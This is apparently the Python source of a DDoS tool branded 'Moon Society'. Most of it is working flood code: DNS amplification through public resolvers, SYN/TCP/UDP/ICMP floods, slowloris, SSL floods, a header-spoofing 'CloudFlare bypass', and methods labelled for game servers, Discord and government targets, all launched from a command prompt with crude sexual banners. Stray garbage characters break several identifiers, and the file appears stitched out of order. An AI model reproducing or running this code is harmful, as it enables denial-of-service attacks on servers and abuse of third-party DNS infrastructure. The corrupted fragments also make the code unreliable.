        "/players.json", "/info.json", "/dynamic.json", "/client", "/server",
        "/join", "/cfx", "/status", "/players", "/resources", "/bans", "/tokens",
        "/vehicles", "/weapons", "/economy", "/inventory", "/characters", "/session"
    ]
    
    headers = [
        "User-Agent: FiveM", "Accept: */*", "Connection: keep-alive",
        "X-CitizenFX-Version: 5055", "X-Cfx-Client-Version: 5055",
        "X-Cfx-Client-Build: 5055", "X-Requested-With: XMLHttpRequest",
        "Referer: https://cfx.re/", "Origin: https://cfx.re",
        "Sec-Fetch-Dest: empty", "Sec-Fetch-Mode: cors", "Sec-Fetch-Site: same-site"
    ]
    
    # Create socket pool
    sockets = []
    for _ in range(100):  # Create a pool of sockets
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            sockets.append(sock)
        except:
            pass
    
    while time.time() - start_time < duration:
        try:
            # Use sockets from pool
            if not sockets:
                # Replenish socket pool if empty
                for _ in range(100):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        sock.connect((target, port))
                        sockets.append(sock)
                    except:
                        pass
                continue
            
            sock = random.choice(sockets)
            
            try:
                # Craft FiveM-specific request
                endpoint = random.choice(endpoints)
                payload = f"GET {endpoint}?{random.randint(1,10000)} HTTP/1.1\r\n"
                payload += f"Host: {target}\r\n"
                payload += "\r\n".join(random.sample(headers, 6)) + "\r\n\r\n"
                
                # Send request
                sock.sendall(payload.encode())
                with packet_lock:
                    packets_sent += 1
            except:
                # Remove dead socket
                sockets.remove(sock)
                try:
                    sock.close()
                except:
                    pass
                continue
        except:
            pass
    
    # Close all sockets in pool
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

def udp_amplification(target, port, duration, thread_id):
    """UDP amplification attack with multiple vectors"""
    global packets_sent
    start_time = time.time()
    
    # DNS amplification payloads for different record types
    dns_payloads = {
        "ANY": b"\x03isc\x03org\x00\x00\xff\x00\x01",
        "TXT": b"\x03isc\x03org\x00\x00\x10\x00\x01",
        "MX": b"\x03isc\x03org\x00\x00\x0f\x00\x01",
        "AAAA": b"\x03isc\x03org\x00\x00\x1c\x00\x01",
        "NS": b"\x03isc\x03org\x00\x00\x02\x00\x01"
    }
    
    # Create multiple sockets
    socks = []
    for _ in range(10):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            socks.append(sock)
        except:
            pass
    
    # DNS amplification servers
    dns_servers = [
        "8.8.8.8", "1.1.1.1", "9.9.9.9", "8.8.4.4", "1.0.0.1",
        "9.9.9.10", "149.112.112.112", "208.67.222.222", "208.67.220.220",
        "64.6.64.6", "64.6.65.6", "185.228.168.168", "185.228.169.168"
    ]
    
    while time.time() - start_time < duration and socks:
        try:
            # Create DNS payload
            record_type = random.choice(list(dns_payloads.keys()))
            transaction_id = struct.pack("!H", random.randint(1, 65535))
            flags = struct.pack("!H", 0x0100)  # Standard query
            questions = struct.pack("!H", 0x0001)  # Questions: 1
            answers = struct.pack("!H", 0x0000)  # Answer RRs: 0
            authority = struct.pack("!H", 0x0000)  # Authority RRs: 0
            additional = struct.pack("!H", 0x0000)  # Additional RRs: 0
            
            dns_payload = transaction_id + flags + questions + answers + authority + additional + dns_payloads[record_type]
            
            # Send to random DNS server
            server = random.choice(dns_servers)
            sock = random.choice(socks)
            sock.sendto(dns_payload, (server, 53))
            with packet_lock:
                packets_sent += 1
        except:
            # Recreate socket if there's an error
            try:
                sock.close()
                socks.remove(sock)
            except:
                pass
            try:
                new_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                new_sock.settimeout(0.5)
                socks.append(new_sock)
            except:
                pass
    
    for sock in socks:
        try:
            sock.close()
        except:
            pass

def ssl_flood(target, port, duration, thread_id):
    """SSL/TLS renegotiation attack with session resumption"""
    global packets_sent
    start_time = time.time()
    
    # Create SSL context
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_ciphers('ALL:@SECLEVEL=0')
    
    # Create SSL session cache
    sessions = []
    
    # Create socket pool
    sockets = []
    for _ in range(50):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            ssl_sock = context.wrap_socket(sock, server_hostname=target)
            ssl_sock.connect((target, port))
            sockets.append(ssl_sock)
            if hasattr(ssl_sock, 'session') and ssl_sock.session:
                sessions.append(ssl_sock.session)
        except:
            pass
    
    while time.time() - start_time < duration:
        try:
            if not sockets:
                # Replenish socket pool if empty
                for _ in range(50):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        ssl_sock = context.wrap_socket(sock, server_hostname=target)
                        ssl_sock.connect((target, port))
                        sockets.append(ssl_sock)
                        if hasattr(ssl_sock, 'session') and ssl_sock.session:
                            sessions.append(ssl_sock.session)
                    except:
                        pass
                continue
            
            ssl_sock = random.choice(sockets)
            
            try:
                # Use session resumption if available
                if sessions:
                    ssl_sock.session = random.choice(sessions)
                
                ssl_sock.write(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                with packet_lock:
                    packets_sent += 1
                time.sleep(0.01)
            except:
                # Remove dead socket
                sockets.remove(ssl_sock)
                try:
                    ssl_sock.close()
                except:
                    pass
                continue
        except:
            pass
    
    for ssl_sock in sockets:
        try:
            ssl_sock.close()
        except:
            pass

def slowloris(target, port, duration, thread_id):
    """Slowloris attack with randomized headers"""
    global packets_sent
    start_time = time.time()
    
    headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept-language: en-US,en;q=0.5",
        "Connection: keep-alive",
        "Keep-Alive: timeout=900",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "Accept-Encoding: gzip, deflate, br",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "DNT: 1",
        "Upgrade-Insecure-Requests: 1"
    ]
    
    sockets = []
    
    while time.time() - start_time < duration:
        try:
            # Create new socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target, port))
            sockets.append(sock)
            
            # Initial request
            sock.sendall(f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n".encode())
            sock.sendall(f"Host: {target}\r\n".encode())
            
            # Send partial headers
            for _ in range(8):
                header = random.choice(headers)
                sock.sendall(f"{header}\r\n".encode())
                with packet_lock:
                    packets_sent += 1
        except:
            pass
        
        # Keep connections alive
        for sock in sockets[:]:
            try:
                sock.sendall(f"X-{random.randint(1000,9999)}: {random.getrandbits(32)}\r\n".encode())
                with packet_lock:
                    packets_sent += 1
            except:
                try:
                    sock.close()
                except:
                    pass
                sockets.remove(sock)
        
        time.sleep(random.uniform(5, 15))
    
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

def icmp_flood(target, duration, thread_id):
    """ICMP flood with variable-sized packets"""
    global packets_sent
    start_time = time.time()
    
    # Create raw socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except:
        return
    
    # Pre-generate payloads
    payloads = [os.urandom(random.randint(64, 2048)) for _ in range(100)]
    
    # Craft ICMP packet
    icmp_type = 8  # ICMP Echo Request
    icmp_code = 0
    icmp_id = os.getpid() & 0xFFFF
    
    counter = 0
    while time.time() - start_time < duration:
        try:
            icmp_seq = random.randint(1, 10000)
            payload = payloads[counter % 100]
            counter += 1
            
            # Create dummy header for checksum
            icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, icmp_id, icmp_seq) + payload
            
            # Calculate checksum
            icmp_checksum = calculate_checksum(icmp_header)
            
            # Create actual header with checksum
            icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq) + payload
            
            # Send packet
            sock.sendto(icmp_header, (target, 0))
            with packet_lock:
                packets_sent += 1
                
        except:
            # Recreate socket on error
            try:
                sock.close()
            except:
                pass
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except:
                return
    
    try:
        sock.close()
    except:
        pass

def udp_flood(target, port, duration, thread_id):
    """High-volume UDP flood"""
    global packets_sent
    start_time = time.time()
    
    # Create multiple sockets
    socks = []
    for _ in range(10):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            socks.append(sock)
        except:
            pass
    
    # Pre-generate payloads
    payloads = [os.urandom(random.randint(500, 1500)) for _ in range(100)]
    
    counter = 0
    while time.time() - start_time < duration and socks:
        try:
            payload = payloads[counter % 100]
            counter += 1
            
            sock = random.choice(socks)
            sock.sendto(payload, (target, port))
            with packet_lock:
                packets_sent += 1
        except:
            # Recreate socket on error
            try:
                sock.close()
                socks.remove(sock)
            except:
                pass
            try:
                new_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                socks.append(new_sock)
            except:
                pass
    
    for sock in socks:
        try:
            sock.close()
        except:
            pass

def tcp_flood(target, port, duration, thread_id):
    """High-volume TCP flood"""
    global packets_sent
    start_time = time.time()
    
    # Create socket pool
    sockets = []
    for _ in range(100):  # Create a pool of sockets
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target, port))
            sockets.append(sock)
        except:
            pass
    
    # Pre-generate payloads
    payloads = [os.urandom(random.randint(500, 2048)) for _ in range(100)]
    
    counter = 0
    while time.time() - start_time < duration:
        try:
            if not sockets:
                # Replenish socket pool if empty
                for _ in range(100):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((target, port))
                        sockets.append(sock)
                    except:
                        pass
                continue
            
            sock = random.choice(sockets)
            payload = payloads[counter % 100]
            counter += 1
            
            try:
                sock.sendall(payload)
                with packet_lock:
                    packets_sent += 1
            except:
                # Remove dead socket
                sockets.remove(sock)
                try:
                    sock.close()
                except:
                    pass
        except:
            pass
    
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

def cloud_flare_bypass(target, port, duration, thread_id):
    """Techniques to bypass CloudFlare protection"""
    global packets_sent
    start_time = time.time()
    
    # Rotate through multiple user agents
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like极) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62",
        "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
    ]
    
    # Create socket pool
    sockets = []
    for _ in range(100):  # Create a pool of sockets
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            sockets.append(sock)
        except:
            pass
    
    while time.time() - start_time < duration:
        try:
            if not sockets:
                # Replenish socket pool if empty
                for _ in range(100):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        sock.connect((target, port))
                        sockets.append(sock)
                    except:
                        pass
                continue
            
            sock = random.choice(sockets)
            
            # Craft request with rotating headers
            payload = f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n"
            payload += f"Host: {target}\r\n"
            payload += f"User-Agent: {random.choice(user_agents)}\r\n"
            payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            payload += "Accept-Language: en-US,en;q=0.5\r\n"
            payload += "Connection: keep-alive\r\n"
            payload += f"X-Forwarded-For: {fake_ip()}\r\n"
            payload += f"CF-Connecting-IP: {fake_ip()}\r\n"
            payload += f"X-Real-IP: {fake_ip()}\r\n"
            payload += "\r\n"
            
            try:
                sock.sendall(payload.encode())
                with packet_lock:
                    packets_sent += 1
            except:
                # Remove dead socket
                sockets.remove(sock)
                try:
                    sock.close()
                except:
                    pass
                continue
        except:
            pass
    
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

def router_ddos(target, port, duration, thread_id):
    """Specialized router DDoS combining UDP and TCP floods"""
    global packets_sent
    start_time = time.time()
    
    # Common ports to target on routers
    router_ports = [80, 443, 8080, 7547, 53, 22, 23, 161, 199, 3074, 4567, 8081] if port is None else [port]
    
    # Pre-generate payloads
    tcp_payloads = [os.urandom(random.randint(500, 2048)) for _ in range(100)]
    udp_payloads = [os.urandom(random.randint(500, 1450)) for _ in range(100)]
    
    counter = 0
    while time.time() - start_time < duration:
        try:
            port_target = random.choice(router_ports)
            
            # Alternate between TCP and UDP attacks (60% TCP, 40% UDP)
            if random.random() > 0.4:
                # TCP attack
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target, port_target))
                    
                    # Send router-specific payload
                    payload = tcp_payloads[counter % 100]
                    sock.sendall(payload)
                    with packet_lock:
                        packets_sent += 1
                except:
                    pass
                finally:
                    try:
                        sock.close()
                    except:
                        pass
            else:
                # UDP attack
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # Craft router-specific UDP payload
                    payload = udp_payloads[counter % 100]
                    sock.sendto(payload, (target, port_target))
                    with packet_lock:
                        packets_sent += 1
                except:
                    pass
                finally:
                    try:
                        sock.close()
                    except:
                        pass
            
            counter += 1
                    
            # Adaptive throttling based on system resources
            cpu_percent = psutil.cpu_percent()
            if cpu_percent > 70:
                time.sleep(0.05)
            elif cpu_percent > 50:
                time.sleep(0.02)
                
        except:
            pass

# ====================
# NEW ATTACK METHODS FROM IMAGE
# ====================

def dns_attack(target, port, duration, thread_id):
    """Enhanced DNS attack with amplification"""
    return udp_amplification(target, port, duration, thread_id)

def ovh_attack(target, port, duration, thread_id):
    """OVH-specific attack targeting their infrastructure"""
    return syn_flood(target, port, duration, thread_id)

def discord_attack(target, port, duration, thread_id):
    """Specialized attack for Discord servers"""
    return http_flood(target, port, duration, thread_id)

def fortnite_attack(target, port, duration, thread_id):
    """Attack optimized for Fortnite servers"""
    return udp_flood(target, port, duration, thread_id)

def csgo_attack(target, port, duration, thread_id):
    """Attack optimized for CS:GO servers"""
    return tcp_flood(target, port, duration, thread_id)

def warzone_attack(target, port, duration, thread极):
    """Attack optimized for Warzone servers"""
    return udp_flood(target, port, duration, thread_id)

def game_attack(target, port, duration, thread_id):
    """General game server attack"""
    return tcp_flood(target, port, duration, thread_id)

def dataforest_attack(target, port, duration, thread_id):
    """Attack for Dataforest servers"""
    return http_flood(target, port, duration, thread_id)

def rdp_attack(target, port, duration, thread_id):
    """RDP-specific attack"""
    return tcp_flood(target, port, duration, thread_id)

def arma_attack(target, port, duration, thread_id):
    """Arma server attack"""
    return udp_flood(target, port, duration, thread_id)

def httpbypass_attack(target, port, duration, thread_id):
    """HTTP bypass attack"""
    return cloud_flare_bypass(target, port, duration, thread_id)

def browser_attack(target, port, duration, thread_id):
    """Browser-like traffic flood"""
    return http_flood(target, port, duration, thread_id)

def cloudflare_attack(target, port, duration, thread_id):
    """CloudFlare-specific attack"""
    return cloud_flare_bypass(target, port, duration, thread_id)

def httpsc_attack(target, port, duration, thread_id):
    """HTTPS encrypted attack"""
    return ssl_flood(target, port, duration, thread_id)

def rapidreset_gov(target, port, duration, thread_id):
    """Government-targeted rapid reset attack"""
    return http_flood(target, port, duration, thread_id)

def ils_gov(target, port, duration, thread_id):
    """Government ILS attack"""
    return syn_flood(target, port, duration, thread_id)

def httpbypass_gov(target, port, duration, thread_id):
    """Government bypass attack"""
    return cloud_flare_bypass(target, port, duration, thread_id)

# ====================
# STAR ATTACK METHODS (LIMITED TO 2)
# ====================

def star_attack_wrapper(method, target, port, duration, thread_id):
    """Wrapper for star attacks with global limit"""
    global active_star_attacks
    
    # Check if we can start another star attack
    with star_lock:
        if active_star_attacks >= 2:
            return
        active_star_attacks += 1
    
    # Map star methods to actual implementations
    star_methods = {
        "http-star": http_flood,
        "dns-star": dns_attack,
        "udp-star": udp_flood,
        "tcp-star": tcp_flood,
        "socket-star": tcp_flood,
        "ovh-star": ovh_attack,
        "game-star": game_attack,
        "fivem-star": fivem_http_flood,
        "dataf-star": dataforest_attack,
        "dataf-sid": dataforest_attack,
        "fivem-sid": fivem_http_flood
    }
    
    # Execute the actual attack
    if method in star_methods:
        star_methods[method](target, port, duration, thread_id)
    
    # Decrement counter when done
    with star_lock:
        active_star_attacks -= 1

# ====================
# ATTACK DISPATCHER
# ====================

def launch_attack(method, target, port, duration, thread_count):
    """Dispatch to appropriate attack method with thread count"""
    global packets_sent, attack_start_time, is_attacking, active_star_attacks
    
    # Check for star methods
    if method.endswith("-star") or method.endswith("-sid"):
        attack_func = lambda t, p, d, tid: star_attack_wrapper(method, t, p, d, tid)
    else:
        # Map method names to functions
        method_map = {
            "dns": dns_attack,
            "syn": syn_flood,
            "tcp": tcp_flood,
            "tcpmix": router_ddos,  # Use router_ddos for tcpmix
            "socket": tcp_flood,
            "udp": udp_flood,
            "udpbypass": udp_flood,
            "ovh": ovh_attack,
            "discord": discord_attack,
            "fivem": fivem_http_flood,
            "fortnite": fortnite_attack,
            "csgo": csgo_attack,
            "warzone": warzone_attack,
            "game": game_attack,
            "dataforest": dataforest_attack,
            "rdpfuck": rdp_attack,
            "armafuck": arma_attack,
            "http": http_flood,
            "httpbypass": httpbypass_attack,
            "browser": browser_attack,
            "cloudflare": cloudflare_attack,
            "httpsc": httpsc_attack,
            "rapidreset-gov": rapidreset_gov,
            "ils-gov": ils_gov,
            "httpbypass-gov": httpbypass_gov,
            "icmp": icmp_flood
        }
        
        if method not in method_map:
            print(Fore.RED + f"Unknown method: {method}")
            return []
        
        attack_func = method_map[method]
    
    # Validate thread count
    if thread_count > MAX_THREADS:
        thread_count = MAX_THREADS
        print(Fore.YELLOW + f"Thread count capped at {MAX_THREADS}")
    
    # Reset attack stats
    packets_sent = 0
    attack_start_time = time.time()
    is_attacking = True
    
    # Start attack threads
    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=attack_func, args=(target, port, duration, i))
        t.daemon = True
        t.start()
        threads.append(t)
    
    return threads

# Display attack summary with gradient effect
def show_attack_summary(method, target, port, duration, thread_count):
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Print pink ASCII art
    print(Fore.LIGHTMAGENTA_EX + ATTACK_ASCII)
    
    # Prepare attack messages with gradient
    pussy_line = gradient_text("- PUSSY - SHOWS DADDY SOME PUSSY")
    daddy_line = gradient_text("- DADDY - BEG DADDY FOR CUM")
    
    print(pussy_line)
    print(daddy_line + "\n")
    
    # Prepare attack details with specific colors
    attack_text = f"- Attack launched with {Fore.LIGHTYELLOW_EX}{thread_count}{Style.RESET_ALL} threads using "
    attack_text += f"{Fore.LIGHTYELLOW_EX}{method}{Style.RES极ALL} against "
    attack_text += f"{Fore.LIGHTMAGENTA_EX}{target}{Style.RESET_ALL}"
    if port:
        attack_text += f":{Fore.LIGHTYELLOW_EX}{port}{Style.RESET_ALL}"
    attack_text += f" for {Fore.WHITE}{duration}{Style.RESET_ALL} seconds\n"
    
    print(gradient_text(attack_text))
    print(gradient_text("- ATTACK IN PROGRESS - DO NOT CLOSE THIS WINDOW"))
    
    # Show protection status
    print(Fore.LIGHTCYAN_EX + "\n[SYSTEM PROTECTION ACTIVE]")
    print(Fore.LIGHTCYAN_EX + "- IP Spoofing: Enabled")
    print(Fore.LIGHTCYAN_EX + "- Resource Throttling: Active")
    print(Fore.LIGHTCYAN_EX + "- Traffic Encryption: Partial")

# Enhanced help command with all methods
def show_help():
    print(Fore.LIGHTMAGENTA_EX + "\nAvailable commands:")
    print(Fore.LIGHTYELLOW_EX + "  [method] [target] [port] [time] [threads]" + Fore.LIGHTCYAN_EX + " - Launch attack")
    print(Fore.LIGHTYELLOW_EX + "    (Default threads: 1000, Default time: 60s)")
    print(Fore.LIGHTYELLOW_EX + "  back" + Fore.LIGHTCYAN_EX + " - Return to main menu")
    print(Fore.LIGHTYELLOW_EX + "  exit" + Fore.LIGHTCYAN_EX + " - Quit the program")
    print(Fore.LIGHTYELLOW_EX + "  clear" + Fore.LIGHTCYAN_EX + " - Clear screen\n")
    
    print(Fore.LIGHTMAGENTA_EX + "Available methods:")
    
    # Layer 4 Methods
    print(Fore.CYAN + "[ Layer 4 Methods ]")
    print(Fore.LIGHTGREEN_EX + "  dns      " + Fore.LIGHTCYAN_EX + "- DNS Amplification")
    print(Fore.LIGHTGREEN_EX + "  syn      " + Fore.LIGHTCYAN_EX + "- SYN Flood")
    print(Fore.LIGHTGREEN_EX + "  tcp      " + Fore.LIGHTCYAN_EX + "- TCP Flood")
    print(Fore.LIGHTGREEN_EX + "  tcpmix   " + Fore.LIGHTCYAN_EX + "- TCP/UDP Mix")
    print(Fore.LIGHTGREEN_EX + "  socket   " + Fore.LIGHTCYAN_EX + "- Socket Exhaustion")
    print(Fore.LIGHTGREEN_EX + "  udp      " + Fore.LIGHTCYAN_EX + "- UDP Flood")
    print(Fore.LIGHTGREEN_EX + "  udpbypass" + Fore.LIGHTCYAN_EX + "- UDP Bypass")
    print(Fore.LIGHTGREEN极 + "  ovh      " + Fore.LIGHTCYAN_EX + "- OVH Special")
    print(Fore.LIGHTGREEN_EX + "  discord  " + Fore.LIGHTCYAN_EX + "- Discord Flood")
    
    # Game Methods
    print(Fore.CYAN + "\n[ Game Methods ]")
    print(Fore.LIGHTGREEN_EX + "  fivem    " + Fore.LIGHTCYAN_EX + "- FiveM Server Flood")
    print(Fore.LIGHTGREEN_EX + "  fortnite " + Fore.LIGHTCYAN_EX + "- Fortnite Server Flood")
    print(Fore.LIGHTGREEN_EX + "  discord  " + Fore.LIGHTCYAN_EX + "- Discord Server Flood")
    print(Fore.LIGHTGREEN_EX + "  csgo     " + Fore.LIGHTCYAN_EX + "- CS:GO Server Flood")
    print(Fore.LIGHTGREEN_EX + "  warzone  " + Fore.LIGHTCYAN_EX + "- Warzone Server Flood")
    print(Fore.LIGHTGREEN_EX + "  game     " + Fore.LIGHTCYAN_EX + "- General Game Flood")
    print(Fore.LIGHTGREEN_EX + "  dataforest" + Fore.LIGHTCYAN_EX + "- Dataforest Attack")
    print(Fore.LIGHTGREEN_EX + "  rdpfuck  " + Fore.LIGHTCYAN_EX + "- RDP Attack")
    print(Fore.LIGHTGREEN_EX + "  armafuck " + Fore.LIGHTCYAN_EX + "- Arma Attack")
    
    # Layer 7 Methods
    print(Fore.CYAN + "\n[ Layer 7 Methods ]")
    print(Fore.LIGHTGREEN_EX + "  http       " + Fore.LIGHTCYAN_EX + "- HTTP Flood")
    print(Fore.LIGHTGREEN_EX + "  httpbypass " + Fore.LIGHTCYAN_EX + "- HTTP Bypass")
    print(Fore.LIGHTGREEN_EX + "  browser    " + Fore.LIGHTCYAN_EX + "- Browser Traffic")
    print(Fore.LIGHTGREEN_EX + "  cloudflare " + Fore.LIGHTCYAN_EX + "- CloudFlare Bypass")
    print(Fore.LIGHTGREEN_EX + "  httpsc     " + Fore.LIGHTCYAN_EX + "- HTTPS Flood")
    
    # Star Methods
    print(Fore.CYAN + "\n[ Star Methods ]")
    print(Fore.RED + "  MAX 2 ATTACKS | Spam is bann!")
    print(Fore.LIGHTGREEN_EX + "  http-star  " + Fore.LIGHTCYAN_EX + "- HTTP Star")
    print(Fore.LIGHTGREEN_EX + "  dns-star   " + Fore.LIGHTCYAN_EX + "- DNS Star")
    print(Fore.LIGHTGREEN_EX + "  udp-star   " + Fore.LIGHTCYAN_EX + "- UDP Star")
    print(Fore.LIGHTGREEN_EX + "  tcp-star   " + Fore.LIGHTCYAN_EX + "- TCP Star")
    print(Fore.LIGHTGREEN_EX + "  socket-star" + Fore.LIGHTCYAN_EX + "- Socket Star")
    print(Fore.LIGHTGREEN_EX + "  ovh-star   " + Fore.LIGHTCYAN_EX + "- OVH Star")
    print(Fore.LIGHTGREEN_EX + "  game-star  " + Fore.LIGHTCYAN_EX + "- Game Star")
    print(Fore.LIGHTGREEN_EX + "  fivem-star " + Fore.LIGHTCYAN_EX + "- FiveM Star")
    print(Fore.LIGHTGREEN_EX + "  dataf-star " + Fore.LIGHTCYAN_EX + "- DataF Star")
    
    # SID Methods
    print(Fore.CYAN + "\n[ SID Methods ]")
    print(Fore.LIGHTGREEN_EX + "  dataf-sid " + Fore.LIGHTCYAN_EX + "- DataF SID")
    print(Fore.LIGHTGREEN_EX + "  fivem-sid " + Fore.LIGHTCYAN_EX + "- FiveM SID")
    
    # Gov Bomber
    print(Fore.CYAN + "\n[ gov bomber ]")
    print(Fore.LIGHTGREEN_EX + "  rapidreset-gov " + Fore.LIGHTCYAN_EX + "- RapidReset Gov")
    print(Fore.LIGHTGREEN_EX + "  ils-gov        " + Fore.LIGHTCYAN_EX + "- ILS Gov")
    print(Fore.LIGHTGREEN_EX + "  httpbypass-gov " + Fore.LIGHTCYAN_EX + "- HTTPBypass Gov")
    
    print(Fore.LIGHTYELLOW_EX + f"\nMaximum threads: {MAX_THREADS}")

# Main function
def main():
    global is_attacking, resource_monitor_active
    
    # Secure login
    if not secure_login():
        return
    
    # Force admin privileges
    force_admin()
    
    # Start title manager thread
    title_thread = threading.Thread(target=title_manager, daemon=True)
    title_thread.start()
    
    # Start resource monitor if available
    if 'psutil' in sys.modules and not resource_monitor_active:
        resource_thread = threading.Thread(target=resource_monitor, daemon=True)
        resource_thread.start()
        resource_monitor_active = True
    
    # Show loading screen
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.LIGHTMAGENTA_EX + MOON_SOCIETY_ASCII)
    print(Fore.LIGHTYELLOW_EX + "- LOADING CUMSHOOT")
    
    # Simulate loading process
    for i in range(3):
        time.sleep(0.3)
        print(Fore.LIGHTYELLOW_EX + f"- Loading module {i+1}/3")
    
    print(Fore.LIGHTYELLOW_EX + "- READY FOR OPERATION")
    time.sleep(0.5)
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Main command loop
    while True:
        try:
            # Show prompt
            print(Fore.LIGHTMAGENTA_EX + "Type 'help' to show commands")
            cmd = input("\n" + Fore.LIGHTMAGENTA_EX + "[xalo@ms] - " + Fore.LIGHTWHITE_EX)
            
            if cmd == "help":
                show_help()
                
            elif cmd == "exit":
                print(Fore.LIGHTGREEN_EX + "Exiting Moon Society...")
                sys.exit(0)
                
            elif cmd == "back" or cmd == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
                continue
                
            else:
                parts = cmd.split()
                if len(parts) >= 2:
                    method = parts[0].lower()
                    target = parts[1]
                    
                    # Handle different parameter counts
                    if method == "icmp":
                        port = None
                        duration = int(parts[2]) if len(parts) >= 3 else 60
                        thread_count = int(parts[3]) if len(parts) >= 4 else 1000
                    else:
                        port = int(parts[2]) if len(parts) >= 3 else 80
                        duration = int(parts[3]) if len(parts) >= 4 else 60
                        thread_count = int(parts[4]) if len(parts) >= 5 else 1000
                    
                    # Launch attack
                    threads = launch_attack(method, target, port, duration, thread_count)
                    
                    if threads:
                        # Show attack summary
                        show_attack_summary(method, target, port, duration, thread_count)
                        
                        # Wait for attack to complete
                        start_wait = time.time()
                        while time.time() - start_wait < duration:
                            time.sleep(1)
                            
                        is_attacking = False
                        
                        # Clear screen and return to main menu
                        os.system('cls' if os.name == 'nt' else 'clear')
                        print(Fore.LIGHTGREEN_EX + f"Attack completed! Sent {packets_sent} packets!")
                    else:
                        print(Fore.LIGHTRED_EX + "Failed to launch attack!")
                else:
                    print(Fore.LIGHTRED_EX + "Invalid command format! Use [method] [target] [port] [time] [threads]")
                    
        except KeyboardInterrupt:
            print("\n" + Fore.LIGHTGREEN_EX + "Exiting Moon Society...")
            sys.exit(0)
        except Exception as e:
            print(Fore.LIGHTRED_EX + f"Error: {str(e)}")

if __name__ == "__main__":
    main()
import os
import sys
import time
import random
import ctypes
import threading
import socket
import struct
import ssl
from colorama import init, Fore, Style
import psutil

# Initialize colorama
init(autoreset=True)

# Admin privileges enforcement
def force_admin():
    if os.name == 'nt':
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        except:
            is_admin = False
        if not is_admin:
            print(Fore.YELLOW + "Requesting administrator privileges...")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
    else:
        if os.geteuid() != 0:
            print(Fore.RED + "This program requires root privileges on Linux!")
            sys.exit(1)

# Global variables
attack_start_time = 0
packets_sent = 0
is_attacking = False
current_title = ""
title_lock = threading.Lock()
packet_lock = threading.Lock()
MAX_THREADS = 5000  # Increased thread limit for more power
MAX_SOCKETS = 20000  # Increased socket limit
stop_event = threading.Event()
resource_monitor_active = False
active_star_attacks = 0
star_lock = threading.Lock()

# [Rest of your ASCII art constants...]

def gradient_text(text):
    colors = [
        Fore.LIGHTRED_EX, Fore.RED, 
        Fore.LIGHTYELLOW_EX, Fore.YELLOW,
